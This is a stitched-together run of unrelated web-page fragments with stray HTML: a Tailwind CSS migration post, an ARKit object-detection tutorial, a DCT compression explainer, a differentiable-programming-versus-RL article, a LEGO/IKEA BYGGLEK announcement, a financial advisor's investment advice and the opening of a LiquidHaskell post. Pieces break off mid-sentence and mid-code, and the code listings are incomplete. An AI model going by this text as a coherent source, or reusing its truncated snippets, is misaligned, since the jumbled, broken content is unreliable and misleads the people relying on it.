  test: <span>/\.css$/i</span>,
  use: [
    ...
    {
      loader: <span>'postcss-loader'</span>,
      options: {
        ident: <span>'postcss'</span>,
        plugins: [<span>require</span>(<span>'tailwindcss'</span>), <span>require</span>(<span>'autoprefixer'</span>)],
      },
    },
        ...
  ],
};
</code></pre>
<p>Rather than muck with our existing SASS files (and all the CSS module cruft that came along with them), we'll just add a brand new CSS file containing:</p>
<pre><code>@<span>tailwind</span> base;
@<span>tailwind</span> components;
@<span>tailwind</span> utilities;
</code></pre>
<p>Add a <code>&lt;link&gt;</code> for this new file in our HTML entry point and that was it. Pretty awesome!</p>
<h2 id="do-yourself-a-favor-install-the-intellisense-plugin">Do yourself a favor - install the IntelliSense plugin</h2>
<p>If you're using VS Code, get this thing immediately:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598428923839/zYTSOVZOs.png?auto=format&amp;q=60" alt="Screen_Shot_2020-08-25_at_21.36.40.png"></p>
<p>Especially when you're first learning, it makes exploring what's available much easier.</p>
<h2 id="start-with-something-easy-buttons">Start with something easy - buttons</h2>
<p>Styling our button component was pretty easy indeed. Our button component has an <code>intent</code> property that controls the button's appearance (e.g. primary, secondary, danger, etc.). So wiring it up with Tailwind looks like:</p>
<pre><code><span>const</span> intentStyles = {
  <span>default</span>: <span>''</span>,
  primary: <span>'bg-blue-500 active:bg-blue-700 hover:bg-blue-300 text-white'</span>,
  secondary: <span>'text-blue-500 bg-none border border-blue-500 active:bg-blue-700 hover:bg-blue-300'</span>,
  danger: <span>'bg-red-500 active:bg-red-700 hover:bg-red-300 text-white'</span>
};

<span>return</span> (
  <span><span>&lt;<span>button</span>
    <span>className</span>=<span>{cn('rounded-sm</span> <span>py-2</span> <span>px-3</span> <span>border-0</span>', <span>intentStyles</span>[<span>intent</span> ?? '<span>default</span>'])}
    <span>...</span>
  &gt;</span>
    ...
  <span>&lt;/<span>button</span>&gt;</span>
)</span>;
</code></pre>
<p>With that in place, our button starts to look pretty button-ish!</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427916574/VaT_ilfvc.gif?auto=format,compress&amp;gif-q=60" alt="ezgif-6-ed728fe71416.gif"></p>
<p>This was all straightforward - basically just reproducing our existing CSS with Tailwind's utility classes. Needed to check the documentation fairly frequently, but that's fine as it's well structured and readable.</p>
<p>At first glance, developing this way looks (and feels) a bit verbose and awkward. We've always been taught to try to keep our presentation separate from our logic. This will take some getting used to! However, it's great that there are no surprises, no hierarchies to worry about and no thinking about "what's a good name for this class?". Let's push on a bit further.</p>
<h2 id="but-those-arent-the-right-colors">But those aren't the right colors</h2>
<p>Yeah, so we cheated a bit and just used <code>bg-blue-500</code> and friends. Not what we really want. Our old SASS code had things like this:</p>
<pre><code>color: <span>var</span>(--accent-color);
</code></pre>
<p>That's a CSS custom property (variable) which we rely on to make dark mode work. How are we going to get Tailwind to spit that out for us?</p>
<p>Turns out it pretty easy. First we need to modify our tailwind.config.js file to tell Tailwind about our custom color extensions:</p>
<pre><code><span>module</span>.exports = {
  ...
  theme: {
    extend: {
      colors: {
        accent: {
          <span>default</span>: <span>'var(--accent-color)'</span>,
          hover: <span>'var(--accent-color-hover)'</span>,
          pressed: <span>'var(--accent-color-pressed)'</span>,
        },
        danger: {
          <span>default</span>: <span>'var(--danger-color)'</span>,
          hover: <span>'var(--danger-color-hover)'</span>,
          pressed: <span>'v…</span></code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="288b"><strong>Adding augmented reality</strong></h2><p id="75c4">Our <code>ViewController</code> is responsible for looping calls of the object detection service and placing annotations whenever an object is recognized. Moreover, the controller increases the accuracy with which annotations are of placed—it doesn’t allow you to place an annotation if the device is moving, the object is too far from the camera, etc.</p><p id="b2f8"><em>The </em><code><em>ViewController</em></code><em> seems a bit overloaded—I would recommend splitting responsibilities into different classes.</em></p><blockquote><p id="803f">In order to keep the tutorial short and clear, I won’t explain the boilerplate code needed to run the AR session. Let’s dive deep into the annotation-related logic!</p></blockquote><h2 id="bd79"><strong>Looping object detection</strong></h2><p id="dcab">To make automatic annotation, we need to persistently loop the process of getting a snapshot of the current frame and sending it to the detection service.</p><figure><div></div></figure><p id="9195">In this code example, you can see the recursion with slight improvements. It uses throttling to do this.</p><blockquote><p id="4f53">Throttling — the mechanism that ensures a function is called at most once every defined time period (for our case, every 1 second).</p></blockquote><p id="c456">As you might have noticed, <code>performDetection</code> runs only when <code>isDetectionEnabled</code> is set to <code>true</code>—this property brings the most performance and accuracy improvements.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1494/1*O2bkepwwwm0G4PRE_Hj8xw.png" width="747" height="522" srcset="https://miro.medium.com/max/552/1*O2bkepwwwm0G4PRE_Hj8xw.png 276w, https://miro.medium.com/max/1104/1*O2bkepwwwm0G4PRE_Hj8xw.png 552w, https://miro.medium.com/max/1280/1*O2bkepwwwm0G4PRE_Hj8xw.png 640w, https://miro.medium.com/max/1400/1*O2bkepwwwm0G4PRE_Hj8xw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*O2bkepwwwm0G4PRE_Hj8xw.png?q=20"></p></div></div></div></figure><p id="8a19">By conforming to the <code>ARSessionDelegate</code> protocol, the controller can track all changes in the current AR session. There are many cases where, in a particular state, we don’t need to run object detection, so we set <code>isDetectionEnabled</code> to <code>false</code>(e.g when AR tracking is limited, initializing is happening, or there is no surface detected). This view controller implements all methods from <code>ARSessionDelegate</code>, and these methods calls <code>onSessionUpdate</code>, which determines the session state and considers whether detection should continue.</p><h2 id="be20"><strong>Device movement</strong></h2><p id="4f07">Take a closer look at the speed limiter. When the device is moving too fast, it adversely affects annotation accuracy. In <code>func session(_ session: ARSession, didUpdate frame: ARFrame)</code> we implement logic that tracks device motion and sets <code>isDetectionEnabled</code> to <code>false</code> whenever the user drives over the speed limit.</p><figure><div></div></figure><p id="9157">Here, we just take the camera node’s position relative to the scene’s world coordinate space and compare it with the previous location, and if the speed over <strong>0.0025</strong> coordinates per frame, detection will be terminated by setting <code>isDetectionEnabled</code><strong> </strong>to <code>false</code>.</p><blockquote><p id="77e3">You may be wondering why 0.0025 is the magic number. This is just the speed value that was determined as optimal for this app by dozens of tests of annotation accuracy. You can tune this value to experiment, as well.</p></blockquote><h2 id="fd14"><strong>Object detection</strong></h2><p id="20f0">When all complex requirements of accuracy and performance are satisfied, finally, it’s time to turn to our object detection model.</p><figure><div></div></figure><ol><li id="b951">Here, we take a snapshot of the current <code>ARFrame</code> and send it to the object detection service. Then we just wait for the callback.</li><li id="e8d1">When the callback is called with success, we need to convert the normalized rect of the recognized object to <code>sceneView</code> size. Thankfully, all the complicated math is done by the <code>VNImageRectForNormalizedRect</code> function.</li><li id="2b0a">And the last thing we do is to place an annotation on the scene root node.</li></ol><h2 id="ffdf"><strong>Adding annotations</strong></h2><p id="89d6">Let’s have a look at the <code>addAnnotation</code> method. It places an annotation if possible—take a closer look at following code to see how this is implemented.</p><figure><div></div></figure><p id="6c26">1. In the first step, we exclude the situation when for one detected object, more than one annotation is placed. Instantiate a center point of the recognized object on the screen using <code>sceneView</code>’s coordinate system. The <code>hitTest</code> method searches the renderer’s scene for objects corresponding to a point, and it uses <code>SCNHitTestSearchMode.all</code> in order to find all intersections of the sent ray with nodes. If in the received result it finds a <code>BubbleNode</code> (the actual name of your annotation filtered by node name), the method’s execution ends.</p><p id="b5e6">2. The next step is to find a plane and point in the world system coordinates where the bubble should be placed. This is done by using raycasting methods <code>raycastQuery</code> and <code>raycast(raycastQuery)</code>.</p><blockquote><p id="dfb3"><a href="https://developer.apple.com/documentation/arkit/arscnview/3194595-raycastquery" target="_blank" rel="noopener">Explanation</a> from the official Apple documentation:</p><p id="6ba3">When you call <code>raycastQuery</code>, ARKit creates a ray that extends in the positive z-direction from the argument screen space point, to determine if any of the argument targets exist in the physical environment anywhere along the ray. If so, ARKit returns a 3D position where the ray intersects the target.</p></blockquote><p id="aea0">3. Here, we implement restricting code that doesn’t allow you to place the bubble if it’s too far from the user’s camera—in this example, the maximum distance between an object and the device is 0,5 m. Feel free to tune this value for your particular needs.</p><p id="f518">4. And finally, last but not least, we place the annotation on the <code>rootNode</code> of the scene. Set the <code>worldPosition</code> of the newly-created <code>BubbleNode</code> to the position determined in step 2, and place and add a child node to the <code>rootNode</code>.</p><blockquote><p id="1fde">Using the<strong> </strong><code>prepare</code> method of the <code>ARSceneView</code> instance is one more approach for performance optimization. It prepares objects for rendering using a background thread, and then returns the execution flow to the main thread.</p></blockquote><p id="46be">I’m sure in the future we’ll see more applications that use <strong>CoreML</strong> and <strong>ARKit</strong> together, as <a target="_blank" rel="noopener" href="https://heartbeat.fritz.ai/combining-artificial-intelligence-and-augmented-reality-in-mobile-apps-e0e0ad2cfddc">they complement themselves perfectly</a>. I believe that the new evolution branch of UX starts here. See you later!</p></div></div></section></div>]]>

For those who don’t know, its a game where a person chooses an item in a room in his mind and the others have to guess it by asking questions (like 20 questions).</p><p>Now, let’s assume that I think of a painting of a boat hanging on the wall and ask a 5 year old to ask questions and guess what I am thinking of.</p><p>For the sake of this example, lets tweak the rules and provide 20 clues ourselves.</p><p>The best clue that we can provide is something like this “the item is hanging on the wall opposite the door”. This is guaranteed to lead the kid close to the prize, right?</p><p>The next best clue would be something like “the item is a square or box-shaped”. After that, we could say something like “it has an ocean and a boat in it.”.</p><p>If you do this carefully, you don’t need 20 clues to guide the kid to the painting – in all likelihood, 5 - 8 clues would suffice.</p><p>And so on.</p><p>What you’ve done is,</p><ul><li>taken data (the location of a painting)</li><li>converted the location into a set of 20 clues</li><li>provided or arranged the clues in order of importance.</li><li>proved that only a few of the clues can capture the location of the painting while the rest of them add details to the puzzle.</li></ul><p>This is in essence what the DCT does. It takes data in one form, converts it to another form such that the output data is arranged in order of importance. This allows us to throw away most of the output data and still be able to get back to the original data.</p><p>Hope you understood what the DCT is trying to achieve. Because, unfortunately, the kid gloves gotta come off now!</p><h2 id="introducing-the-discrete-cosine-transform">Introducing the Discrete Cosine Transform</h2><p>The Discrete Cosine Transform or DCT is a widely used transform for image and video compression. It’s definition as per Wikipedia is as follows :-</p><blockquote><p>The Discrete Cosine Transform expresses a finite sequence of data points in terms of a sum of cosine functions oscillating at different frequencies.</p></blockquote><p>Still with me? Don’t worry about the math behind the DCT for now.</p><p>In simpler terms, the Discrete Cosine Transform takes a set of <code>N</code> correlated (similar) data-points and returns <code>N</code> de-correlated (dis-similar) data-points (coefficients) in such a way that the energy is compacted in only a few of the coefficients <code>M</code> where <code>M &lt;&lt; N</code>.</p><p>If that doesn’t make sense, try and remember this - the DCT takes input data and converts it to another domain while doing two very important things -</p><ol><li><strong>it de-correlates the data (removes any relation or similarity between the data points)</strong></li><li><strong>it compacts the energy/information into only a few of the output data points</strong></li></ol><p>To summarize, the DCT takes</p><ul><li>N data-points as its input</li><li>returns N data-points as its output</li><li>and ensures, that most of the information of the input is concentrated in only a few of the N output data-points.</li></ul><p>This is called the energy-compaction (or information compaction) property of the DCT.</p><p>Let’s understand this with an example using MATLAB.</p><p>Take an <code>8x8</code> matrix filled with the number <code>255</code> as shown below. If you need <code>8</code> bits to store each number, then you need <code>8 x 64 = 512</code> bits for storing the entire matrix. Good so far?</p><figure><img src="https://ottverse.com/images/input_255.png"></figure><p>Okay, now, let’s apply an <code>8x8</code> 2D-DCT to this matrix and get <code>8x8</code> DCT coefficients. They are shown below.</p><figure><img src="https://ottverse.com/images/coeffs_255.png"></figure><p>Looks different, doesn’t it?</p><p>If you notice carefully, the first coefficient (<code>[0, 0]</code>) element of the matrix is non-zero and the rest of the elements are zero. This greatly reduces the storage space needed for this matrix.</p><p>This is due to the de-correlating and energy compaction property of the DCT. This is usually described as follows in technical literature and can be a little difficult to understand -</p><blockquote><p><strong><em>the DCT has compacted the energy of the matrix into the first element referred to as the <code>DC</code> coefficient. The rest of the coefficients are called the <code>AC</code> coefficients.</em></strong></p></blockquote><p>What this is referring to is -</p><ul><li>the top-left corner of the output 2D DCT is called the DC coefficient. It is the most important output of the DCT and contains a lot of information about the original image.</li><li>the rest of the coefficients are called the AC coefficients. If you are transforming an image using the DCT, the AC coefficients contain finer details of the image.</li></ul><p>Now, if I take these DCT coefficients and apply an inverse-2D-DCT to it, I will get back the original coefficients.</p><p>If you want to try it out, here are the MATLAB commands to replicate the above experiment.</p><div><pre><code data-lang="matlab">inputPixels = <span>ones</span>(<span>8</span>,<span>8</span>) * <span>255</span>;

The Karhunen–Loève transform (KLT) often referred to as the <em>ideal transform</em> has much better decorrelating properties but is computationally intractable. The DCT on the other hand, is easy to program and has captured the image and video compression world.</p><p>Here is a simple MATLAB <a href="https://in.mathworks.com/help/images/ref/dct2.html">script</a> that demonstrates the power of the 2D-DCT when applied to image compression (and, in extension to video compression).</p><div><pre><code data-lang="matlab"><span>% read an image (MATLAB provides a few sample images)</span>

<p>We’ve discussed the idea of <a href="https://fluxml.ai/2019/02/07/what-is-differentiable-programming.html">differentiable programming</a>, where we incorporate existing programs into deep learning models. This article shows what ∂P can bring to some simple but classic control problems, where we would normally use black-box Reinforcement Learning (RL). ∂P-based models not only learn far more effective control strategies, but also train orders of magnitude faster. The <a href="https://github.com/FluxML/model-zoo/tree/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming">code</a> is all available to run for yourself – they will mostly train in a few seconds on any laptop.</p>

<h2 id="follow-the-gradient">Follow the Gradient</h2>

<p>Differentiation is what makes deep learning tick; given a function [[y = f(x)]] we use the gradient [[\frac{dy}{dx}]] to figure out how a change in [[x]] will affect [[y]]. Despite the mathematical clothing, gradients are actually a very general and intuitive concept. Forget the formulas you had to stare at in school; let’s do something more fun, like throwing stuff.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-basic.gif"></p>

<p>When we throw things with a trebuchet, our [[x]] represents a setting (say, the size of the counterweight, or the angle of release), and [[y]] is the distance the projectile travels before landing. If you’re trying to aim, the gradient tells you something very useful – whether a change in aim will increase or decrease the distance. To maximise distance, just follow the gradient.</p>

<p>Alright, but how can we get this magical number? The trick is a process called <a href="https://github.com/FluxML/Zygote.jl">algorithmic differentiation</a>, which is able to differentiate not only simple formulas like you learned in school, but also <em>programs</em> of any complexity – like our trebuchet simulator. The upshot is that we can take a <a href="https://github.com/Roboneet/Trebuchet.jl">simple simulator</a>, written in Julia and <a href="https://github.com/JuliaDiffEq/DifferentialEquations.jl">DiffEq</a> with no deep learning in mind, and get gradients for it in a single function call.</p>

</code></pre></div></div>

<p>Now we have that, let’s do something interesting with it.</p>

<h2 id="throwing-stuff">Throwing Stuff</h2>

<p>A simple way to use this is to aim the trebuchet at a target, using gradients to fine-tune the angle of release; this kind of thing is common under the name of <em>parameter estimation</em>, and we’ve <a href="https://julialang.org/blog/2019/01/fluxdiffeq">covered examples like it before</a>. We can make things more interesting by going meta: instead of aiming the trebuchet given a single target, we’ll optimise a neural network that can aim it given <em>any</em> target. Here’s how it works: the neural net takes two inputs, the target distance in metres and the current wind speed. The network spits out trebuchet settings (the mass of the counterweight and the angle of release) that get fed into the simulator, which calculates the achieved distance. We then compare to our target, and <em>backpropagate through the entire chain</em>, end to end, to adjust the weights of the network. Our “dataset” is a randomly chosen set of targets and wind speeds.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-flow.png"></p>

<p>A nice property of this simple model is that training it is <em>fast</em>, because we’ve expressed exactly what we want from the model in a fully differentiable way. Initially it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-miss.gif"></p>

<p>After about five minutes of training (on a single core of my laptop’s CPU), it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-hit.gif"></p>

<p>If you want to try pushing it, turn up the wind speed:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-wind.gif"></p>

<p>It’s only off by 16cm, or about 0.3%.</p>

<p>What about just aiming the trebuchet directly? It is easy to do this by gradient descent given that we have gradients. However, this is a slow iterative process that takes around 100ms each time. In contrast, running the neural network takes 5μs (twenty thousand times faster) with only a small loss in accuracy. This “approximate function inversion via gradients” trick is a very general one that can not only be used with dynamical systems, but also lies behind the <a href="https://github.com/lengstrom/fast-style-transfer">fast style transfer</a> algorithm.</p>

<p>This is about the simplest possible control problem, which we use mainly for illustrative purposes. But we can apply the same techniques, in more advanced ways, to classic RL problems as well.</p>

<h2 id="cart-meet-pole">Cart, meet Pole</h2>

<p>A more recognisable control problem is <a href="https://gym.openai.com/envs/CartPole-v0/">CartPole</a>, the “hello world” for reinforcement learning. The task is to learn to balance an upright pole by nudging its base left or right. Our setup is broadly similar to the trebuchet case: a <a href="https://github.com/tejank10/Gym.jl">Julia implementation</a> means we can directly treat the reward produced by the environment as a loss. ∂P allows us to switch seamlessly from model-free to model-based RL.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole-flow.png"></p>

<p>The astute reader may notice a snag. The action space for cartpole – nudge left or right – is discrete, and therefore not differentiable. We solve this by introducing a <em>differentiable discretisation</em>, defined <a href="https://github.com/FluxML/model-zoo/blob/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming/cartpole/DiffRL.jl#L32">like so</a>:</p>

<p>$[[\begin{aligned}
  f(x) &amp;=
    \begin{cases}
    1 &amp; x \ge 0 \\
    -1 &amp; x &lt; 0
    \end{cases} \\
  \frac{df}{dx} &amp;= 1
\end{aligned}]]</p>

<p>In other words, we force the gradient to behave as if [[f]] were the identity function. Given how much the mathematical idea of differentiability already gets abused in ML, it’s perhaps not surprising that we can just cheat here; for training all we need is a signal to inform our pseudo-random walk around parameter space, and the rest is details.</p>

<p>The results speak for themselves. Where RL methods need to train for hundreds of episodes before solving the problem, the ∂P model only needs around 5 episodes to win conclusively.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole.gif"></p>

<h2 id="the-pendulum--backprop-through-time">The Pendulum &amp; Backprop through Time</h2>

<p>An important aim for RL is to handle <em>delayed reward</em>, when an action doesn’t help us until several steps in the future. ∂P allows this too, and in a very familiar way: when the environment is differentiable, we can actually train the agent using backpropagation through time, just like a recurrent net! In this case the environmental state becomes the “hidden state” that changes between time steps.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/bptt.png"></p>

<p>To demonstrate this technique we looked at the <a href="https://github.com/openai/gym/wiki/Pendulum-v0">pendulum</a> environment, where the task is to swing a pendulum until it stands upright, keeping it balanced with minimal effort. This is hard for RL models; after around 20 episodes of training the problem is solved, but often the route to a solution is visibly sub-optimal. In contrast, BPTT can beat the <a href="https://github.com/openai/gym/wiki/Leaderboard#pendulum-v0">RL leaderboard</a> in <em>a single episode of training</em>. It’s instructive to actually watch this episode unfold; at the beginning of the recording the strategy is random, and the model improves over time. The pace of learning is almost alarming.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-training.gif"></p>

<p>Despite only experiencing a single episode, the model generalises well to handle any initial angle, and has something pretty close to the optimal strategy. When restarted the model looks more like this.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-dp.gif"></p>

<p>This is just the beginning; we’ll get the real wins applying DP to environments that are too hard for RL to work with at all, where rich simulations and models already exist (as in much of engineering and the sciences), and where interpretability is an important factor (as in medicine).</p>

<h2 id="the-map-is-not-the-territory">The Map Is Not The Territory</h2>

<p>The limitation of these toy models is that they equate the simulated training environment with the test environment; of course, the real world is not differentiable. In a more realistic model the simulation gives us a coarse outline of behaviour that is refined with data. That data informs (say) the simulated effect of wind, in turn improving the quality of gradients the simulator passes to the controller. Models can even form part of a controller’s forward pass, enabling it to refine its predictions without having to learn system dynamics from scratch. Exploring these new architectures will make for exciting future work.</p>

<h2 id="coda">Coda</h2>

<p>The core idea is that <em>differentiable programming</em>, where we simply write an arbitrary numerical program and optimise it via gradients, is a powerful way to come up with better deep learning-like models and architectures – especially when we have a large library of differentiable code to hand. The toy models described are really only previews, but we hope they give an intuition for how these ideas can be applied in more realistic ways.</p>

<p>Just as functional programming involves reasoning about and expressing algorithms using functional patterns, differentiable programming involves expressing algorithms using differentiable patterns. Many such design patterns have already been developed by the deep learning community, such as for handling control problems or sequence and tree structured data. As the field matures, many more will be invented, and the resulting programs are likely to make even the most advanced current deep learning architectures look crude by comparison.</p>

<p>My sources also tell me that there is also a play-table with studs on the surface and drawers beneath to keep your loose bricks which are great for kids to explore their creativity as well as keeping the place tidy.</p>
<p>The launch for Bygglek is slated to be in October 2020 but a lot of things are in flux now due to the covid-19 pandemic.</p>
<p>Stay tuned!</p>

<p><strong>Playing is crucial for the well-being of both adults and children. Together, LEGO Group and IKEA explore and develop solutions to stimulate play all around the home. The collaboration will result in BYGGLEK.</strong></p>
<p>One year ago, IKEA and LEGO Group&nbsp;partnered up to be creative, exchange knowledge and experiment together with the ambition to develop new solutions to facilitate play in every corner of the home. Research from IKEA and LEGO Group has shown that there’s a demand among children for more playtime with their parents. At the same time, parents believe that playing is essential to their children’s well-being and happiness. Despite this, children and adults encounter several barriers and challenges when it comes to making play happen. Busy schedules and homework are a couple of obstacles, other restrictions like finding the space to play are more evident for adults than for children.</p>
<p>“There’s a conflict between how grown-ups look at organising and how children look at the creative play. Every grown-up has stepped on a Lego brick at night time. But organising LEGO bricks the grown-up way also means ending the play sometimes. Adults sort by typology – socks going into one drawer and belts into another. Kids sort by story, clustering it into different pieces, where you can have a half-built space ship. And in that, you can find the one piece that you need. What if we could turn that perceived mess into something wonderful?”, says Rasmus Buch Løgstrup, designer at LEGO Group.</p>
<p>The different perspectives might lead to that children experience rules, carried out by their parents, stops them from being as creative and playful as they wish. Parents, on the other hand, feel that playing can be a bit too messy at home, making it harder to fulfil other commitments of the everyday. The overlaying ambition between the collaboration between LEGO Group and IKEA is to overcome these kinds of obstacles. The hope is to move away from “no” to “yes” to play, and at the same time show respect to duties of the everyday.</p>
<p>“To do this, systematic thinking becomes key. We know that children continue the story building in their minds long after they have stopped playing with their toys. So we asked ourselves, couldn’t pause and play be a way to enable quick play? We know that children are playing with screens because it’s easy to get started. So what if we could make the LEGO play continue? That would make quick play easier and then build on the play that is continuing in the child’s mind anyway”, says Andreas Fredriksson, designer at IKEA.</p>
<p>To enable playing throughout the home with pauses, a solution across generations is needed. Also, different rooms need different solutions that can change after different phases in life.</p>
<p>“Bringing people together over play and enable more play are things that are key for both us and LEGO Group&nbsp;based on our respective visions, missions and values. That is why we want to explore what can happen when we work together, trying to get more of the many people to say yes to play”, says Andreas Fredriksson, designer at IKEA.</p>
<p>The aim is to sale start the first BYGGLEK products during 2020.</p>

            <p>If you're about to make an serious financial move--either rolling over your 401k, deciding to retire, or maybe selling your business or deploying an inheritance--you have some important investment decisions to make. &nbsp;What are the biggest considerations before you move forward? &nbsp;I believe there are five decisions you have to think through carefully to achieve the best investment and financial experience. &nbsp;</p><p>Yet most people don't know where to begin and I don't remember, in 22 years of working as a financial advisor, <em><strong>ever</strong></em> talking to someone who understood or had evaluated all of them. &nbsp;So let me outline the five investment decisions that really matter, step by step:</p><p><span><span><strong>#1 --</strong></span><em><span><strong>&nbsp;</strong></span><span><strong>I</strong></span><span><strong>nvest or Sit on the Sidelines?</strong></span></em></span></p><p>This should be an obvious one but it really isn't. &nbsp;I see way too many people with an exorbitant amount of money in savings and money market accounts. &nbsp;These are good parking places for 6-18 months of living expenses, as well as a big ticket purchase you might make in the next three years, such as the down payment on a new house. &nbsp;For all your excess savings, you need to invest it in longer-term, growth and income assets. &nbsp;Simply moving from cash (One-Month T-Bills) to a bond fund has historically netted you about 3% per year in additional returns. &nbsp;The decision to invest with money you can afford to set aside for more than a year or two is crucial. &nbsp;Guessing that the market will go down and you'll be able to get in at a better point is unlikely.</p><p><img src="https://static.fmgsuite.com/media/images/e995d0cf-ea76-46c4-aa43-a02306df857d.jpg" data-id="7da2e5ec-e11a-4ebf-8ee0-5467fdcf0324"></p><p><img src="https://static.fmgsuite.com/media/images/58496942-52f6-41a6-aceb-db6ef2b86ef3.jpg" data-id="7c3031dd-8f7e-471a-ae51-831bb8a6f51e"></p><p><span><strong>#2 -- <em>Be An "Owner" Or a "Loaner"?</em></strong></span></p><p>When you buy bonds, you are loaning out your savings to the government or a corporation in return for an agreed upon rate of interest over a pre-set period of time. &nbsp;That's been better than keeping your money in cash, but it hasn't done as well as taking an ownership stake in a business, which is exactly what you're doing when you purchase a share of stock. &nbsp;You become a small fractional owner in the company, and are entitled to your share of earnings growth (through share price appreciation) and dividends. &nbsp;Over time, owning stocks instead of bonds has created significantly greater wealth -- just as the decision to simply invest as opposed to keeping your money in cash has netted you almost 3% a year higher returns, investing in the US stock market (the Vanguard CRSP 1-10 Index) has also netted you an additional 3% in returns compared to a bond index.</p><p><img src="https://static.fmgsuite.com/media/images/79cbc2fe-5090-4fc8-a5e1-68a9169bba71.jpg" data-id="f50dc679-f207-4bec-ac06-8c70c11afec5"></p><p><img src="https://static.fmgsuite.com/media/images/4dbaaa6e-a76c-42c1-89b8-401e1db4756b.jpg" data-id="df0f6950-34ff-46ae-be23-31e60ed697ad"></p><p><span><strong>#3 -- <em>Which Stocks Should You Buy?</em></strong></span></p><p>The stock market is dominated by the largest and highest-priced companies. &nbsp;This means that you get a relatively small amount of earnings for each share you own. &nbsp;What's more, due to the intense competition in free market economies, large successful companies have a difficult time maintaining their leadership positions. &nbsp;Over time, smaller and less successful companies with low prices and low past/current earnings have been able to reinvent themselves, boost profitability, and take leadership away from the giant bureaucracies that get all the attention. &nbsp;The result is that smaller and lower-priced value stocks have delivered much greater long-term returns than a large cap growth-dominated market index. &nbsp;To get the most bang for your buck from your stock investments, you need to emphasize the asset classes with the higher expected returns: small cap and value stocks. &nbsp;</p><p><strong>Over time, the decision to favor small value stocks over the large growth stocks that dominate a basic stock market index fund has led to over 4% per year higher returns -- a bigger return advantage than the stock/bond decision!&nbsp;</strong></p><p><strong><img src="https://static.fmgsuite.com/media/images/1dfb17fb-fa81-48a7-859c-6849f7bf32d5.jpg" data-id="0daa0886-3d4e-43a2-998c-101803f0b3c5"></strong></p><p><img src="https://static.fmgsuite.com/media/images/6758639f-d22c-419f-84eb-85c75654cdcc.jpg" data-id="61d39632-9d04-4330-aeee-dc26deb7eb93"></p><p><span><strong>#4 -- <em>Should You</em>&nbsp;<em>Diversify Globally or Keep All Your Eggs In One Basket?</em></strong></span></p><p>Despite the much higher returns generated by small cap value stocks compared to the basic stock market index over time, you shouldn't bet the farm on any one asset class. &nbsp;Diversification across different asset classes can produce higher long-term returns without commensurately higher risk. &nbsp;Instead of just investing in US stocks, you should spread your portfolio out amongst US and non-US stocks, emphasizing smaller and more value-oriented companies in each region. &nbsp;An example of a portfolio that is well diversified across large/small and growth/value stocks in US and non-US markets is the DFA Global Equity Index.</p><p>Looking at the table below, we find that the <strong>DFA Global Equity Index's return of +12.5% per year was over 2% annually higher than the Vanguard CRSP 1-10 US Stock Index</strong>, without additional risk (standard deviation)! &nbsp;Broad diversification is the only free lunch you'll find in investing.</p><p><img src="https://static.fmgsuite.com/media/images/03bf1442-8c8e-483e-ad2c-3b4a5158c0ec.jpg" data-id="448433b8-c023-4b1f-ba9f-8c3504e32c8e"></p><p><img src="https://static.fmgsuite.com/media/images/7d31f374-1c2e-4755-a1f4-1e71a9bfdb9e.jpg" data-id="3c590b2d-87b7-4a5f-be58-26b7e7219deb"></p><p><span><strong><span>#5 -- <em>What's The Best Asset Allocation For You?</em></span></strong></span></p><p>Having learned how to invest to earn the highest long-term returns without taking unnecessary risk, it's now time to decide how much return you will need and how much volatility and (unpredictable) short-term loss you are willing to accept to achieve that return. &nbsp;Fortunately, once you understand the right way to invest, all of the options are good; there are no wrong decisions. &nbsp;Instead they are tradeoffs -- more pain = more expected gain, and vice versa. &nbsp;</p><p>(a) For maximum growth, you can choose an all-stock portfolio, such as the DFA Global Equity Index, with much greater long-term returns and stock market index-like risk.</p><p>(b) You could add a small amount (20%) in investment grade bonds and still expect to earn future returns greater than a US stock index thanks to the 80% that remains in stocks, but with less variability. &nbsp;</p><p>(c) Or you could opt for a standard retirement allocation, 60% stocks and 40% bonds. &nbsp;This balanced portfolio, with higher expected returning stocks, has historically earned a slightly better return than the US stock market index (which is dominated by the largest growth stocks). &nbsp;But with 40% less volatility and milder short-term declines.</p><p><img src="https://static.fmgsuite.com/media/images/25278bad-49c7-4abf-a7dc-b9aca9d637b8.jpg" data-id="3d9ad38e-db5d-4eff-a5d2-4eb6e23799b6"></p><p><img src="https://static.fmgsuite.com/media/images/8fd53e40-d29f-4336-9436-319123341bd4.jpg" data-id="47f8d0ca-4845-494a-9b84-20296ceb79ef"></p><p>Whichever allocation you choose, the most important thing is to<strong> stick with your portfolio through ups and downs</strong>. &nbsp;Getting in and out at the wrong time could cause you to miss several % a year in potential gains and could put you at risk of failing to achieve your goals. &nbsp;Once you've chosen your path, you've gotta stay the course. &nbsp;</p><p>Unfortunately, most investors have a hard time sitting tight when headlines turn scary, which is why hiring a full-time, independent financial advisor to help you design the right portfolio for your unique goals and work with you to stay the course could be another great decision.</p><p>___________________________________________________________</p><p><strong>DFA Global

<p>I enjoy working with LH. However, I’d be the very first to confess that it has been incredibly tedious to get to work on <em>existing</em> code bases, for various reasons.</p>
<ol type="1">
<li><p>LH ran <em>one file at a time</em>; it was a hassle to <strong>systematically analyze</strong> all the modules in a single package.</p></li>
<li><p>LH had <em>no notion of packages</em>; it was impossible to <strong>import specifications</strong> across packages.</p></li>
